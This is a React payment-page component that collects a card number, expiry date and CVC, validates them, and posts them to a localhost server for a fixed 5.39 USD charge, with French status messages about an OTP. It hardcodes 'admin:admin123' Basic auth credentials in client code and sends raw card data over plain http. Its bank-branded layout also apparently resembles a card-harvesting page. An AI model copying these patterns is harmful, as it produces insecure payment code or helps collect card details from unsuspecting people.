import React, { useState } from 'react'; // Import React and useState hook for state management
import '../global.css'; // Import global CSS for styling
import SPMB from '../images/SPMB.png'; // Import bank logo image

const PaymentPage = () => {
    // State to manage payment form data (card number split into 4 parts, expiry, and CVC)
    const [formData, setFormData] = useState({
        cardPart1: '', // First 4 digits of card number
        cardPart2: '', // Second 4 digits
        cardPart3: '', // Third 4 digits
        cardPart4: '', // Last 4 digits
        expiry: '', // Expiry date (MM/YY)
        cvc: '' // Card verification code
    });

    // State to track validation errors for each field
    const [errors, setErrors] = useState({});

    // State to display processing status messages
    const [status, setStatus] = useState('');

    // State to disable inputs/buttons during processing
    const [isProcessing, setIsProcessing] = useState(false);

    // Handle input changes for all fields
    const handleChange = (e) => {
        const { name, value } = e.target; // Extract field name and value from event

        if (name === 'expiry') { // Special handling for expiry field
            // Handle expiry date formatting (MM/YY)
            const cleaned = value.replace(/\D/g, ''); // Remove non-digits

            if (cleaned.length <= 4) { // Limit to 4 digits (MMYY)
                let formatted = cleaned;

                // Automatically add slash after 2 digits (MM/YY)
                if (cleaned.length > 2) {
                    formatted = cleaned.slice(0, 2) + '/' + cleaned.slice(2);
                }

                // Validate month (01-12)
                if (cleaned.length >= 2) {
                    const month = parseInt(cleaned.substring(0, 2));
                    if (month < 1 || month > 12) {
                        setErrors(prev => ({ ...prev, expiry: 'Month must be between 01-12' }));
                    } else {
                        setErrors(prev => {
                            const newErrors = { ...prev };
                            delete newErrors.expiry; // Clear error if valid
                            return newErrors;
                        });
                    }
                }

                setFormData(prev => ({ ...prev, [name]: formatted })); // Update expiry field
            }
        } else if (name.startsWith('cardPart') && value.length <= 4 && /^\d*$/.test(value)) {
            // Handle card number parts: limit to 4 digits, only numbers allowed
            setFormData(prev => ({ ...prev, [name]: value }));
        } else if (name === 'cvc' && value.length <= 4 && /^\d*$/.test(value)) {
            // Handle CVC: limit to 4 digits, only numbers allowed
            setFormData(prev => ({ ...prev, [name]: value }));
        }
    };

    // Validate the entire form before submission
    const validateForm = () => {
        let tempErrors = {};
        const fullCardNumber = `${formData.cardPart1}${formData.cardPart2}${formData.cardPart3}${formData.cardPart4}`; // Combine card parts

        // Check if card number is exactly 16 digits
        if (!fullCardNumber.match(/^\d{16}$/)) {
            tempErrors.cardNumber = 'Card number must be 16 digits';
        }

        // Validate expiry date format and expiration status
        if (!formData.expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
            tempErrors.expiry = 'Invalid expiry date (MM/YY)';
        } else {
            // Check if card is expired
            const [month, year] = formData.expiry.split('/');
            const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1, 1); // Create expiry date object
            const today = new Date();

            if (expiryDate < today) {
                tempErrors.expiry = 'Card is expired';
            }
        }

        // Validate CVC (3 or 4 digits)
        if (!formData.cvc.match(/^\d{3,4}$/)) {
            tempErrors.cvc = 'CVC must be 3 or 4 digits';
        }

        setErrors(tempErrors); // Update errors state
        return Object.keys(tempErrors).length === 0; // Return true if no errors
    };

    // Handle form submission for payment processing
    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent default form submission
        if (!validateForm()) { // Validate form before proceeding
            return;
        }
        setIsProcessing(true); // Disable inputs during processing
        setStatus('Vérification des informations...'); // Update status message
        const cardNumber = `${formData.cardPart1}${formData.cardPart2}${formData.cardPart3}${formData.cardPart4}`; // Combine card number

        try {
            // Send payment request to server
            const response = await fetch('http://localhost:8443/api/process-payment', {
                method: 'POST', // HTTP method
                headers: {
                    'Content-Type': 'application/json', // JSON content type
                    'Authorization': 'Basic ' + btoa('admin:admin123') // Basic auth header (admin:admin123 encoded)
                },
                body: JSON.stringify({
                    cardNumber, // Full 16-digit card number
                    expiry: formData.expiry, // Expiry date
                    cvc: formData.cvc, // CVC code
                    amount: 5.39 // Hardcoded payment amount
                })
            });

            if (response.ok) {
                // Success message if payment info is verified
                setStatus('Informations vérifiées. Un code OTP vous a été envoyé. Le processus de validation se poursuit automatiquement...');
            } else {
                // Failure message if verification fails
                setStatus('Échec de la vérification des informations de paiement');
            }
        } catch (error) {
            console.error('Erreur:', error); // Log error to console
            setStatus('Une erreur s\'est produite lors du traitement de votre demande'); // Generic error message
        } finally {
            setIsProcessing(false); // Re-enable inputs after processing
        }
    };

    // Auto-tab between card number fields when 4 digits are entered
    const handleCardInputKeyUp = (e, nextFieldName) => {
        if (e.target.value.length === 4 && nextFieldName) {
            document.querySelector(`input[name="${nextFieldName}"]`).focus(); // Move focus to next field
        }
    };

    // JSX to render the payment form UI
    return (
        <div className="payment-container"> {/* Main container for payment page */}
            <div className="left-logo"> {/* Logo container */}
                <img src={SPMB} alt="Bank Logo" /> {/* Display bank logo */}
            </div>
            <div className="amount">5.39 USD</div> {/* Display hardcoded payment amount */}
            <div className="merchant">Grapes</div> {/* Display merchant name */}
            {status && <div className="status-message">{status}</div>} {/* Show status message if present */}
            <form onSubmit={handleSubmit}> {/* Payment form with submit handler */}
                <div className="input-container card-number-group"> {/* Group for card number inputs */}
                    <input
                        type="text" // Text input for card number part 1
                        name="cardPart1" // Field name matches state
                        value={formData.cardPart1} // Controlled input value
                        onChange={handleChange} // Update state on change
                        onKeyUp={(e) => handleCardInputKeyUp(e, 'cardPart2')} // Auto-tab to next field
                        maxLength="4" // Limit to 4 digits
                        placeholder="XXXX" // Placeholder text
                        className="card-part" // Styling class
                        disabled={isProcessing} // Disable during processing
                    />
                    <input
                        type="text" // Text input for card number part 2
                        name="cardPart2"
                        value={formData.cardPart2}
                        onChange={handleChange}
                        onKeyUp={(e) => handleCardInputKeyUp(e, 'cardPart3')} // Auto-tab to next field
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                    <input
                        type="text" // Text input for card number part 3
                        name="cardPart3"
                        value={formData.cardPart3}
                        onChange={handleChange}
                        onKeyUp={(e) => handleCardInputKeyUp(e, 'cardPart4')} // Auto-tab to next field
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                    <input
                        type="text" // Text input for card number part 4
                        name="cardPart4"
                        value={formData.cardPart4}
                        onChange={handleChange}
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                </div>
                <span className="required">*</span> {/* Indicate required field */}
                {errors.cardNumber && <span className="error">{errors.cardNumber}</span>} {/* Show card number error */}

                <div className="input-container"> {/* Container for expiry input */}
                    <input
                        type="text" // Text input for expiry date
                        name="expiry"
                        placeholder="MM/YY" // Placeholder format
                        value={formData.expiry}
                        onChange={handleChange}
                        maxLength="5" // Limit to 5 characters (MM/YY)
                        disabled={isProcessing}
                    />
                    <span className="required">*</span> {/* Indicate required field */}
                    {errors.expiry && <span className="error">{errors.expiry}</span>} {/* Show expiry error */}
                </div>

                <div className="input-container"> {/* Container for CVC input */}
                    <input
                        type="text" // Text input for CVC
                        name="cvc"
                        placeholder="CVC" // Placeholder text
                        value={formData.cvc}
                        onChange={handleChange}
                        maxLength="4" // Limit to 4 digits
                        disabled={isProcessing}
                    />
                    <span className="required">*</span> {/* Indicate required field */}
                    {errors.cvc && <span className="error">{errors.cvc}</span>} {/* Show CVC error */}
                </div>

                <button type="submit" disabled={isProcessing}> {/* Submit button */}
                    {isProcessing ? 'Traitement en cours...' : 'Pay 5.39 USD'} {/* Dynamic text */}
                </button>
            </form>
            <div className="card-icons"> {/* Container for card brand logos */}
                <img
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/200px-MasterCard_Logo.svg.png"
                    alt="Mastercard" // Mastercard logo
                />
                <img
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/200px-Visa_Inc._logo.svg.png"
                    alt="Visa" // Visa logo
                />
            </div>
        </div>
    );
};

export default PaymentPage; // Export the component for use in the app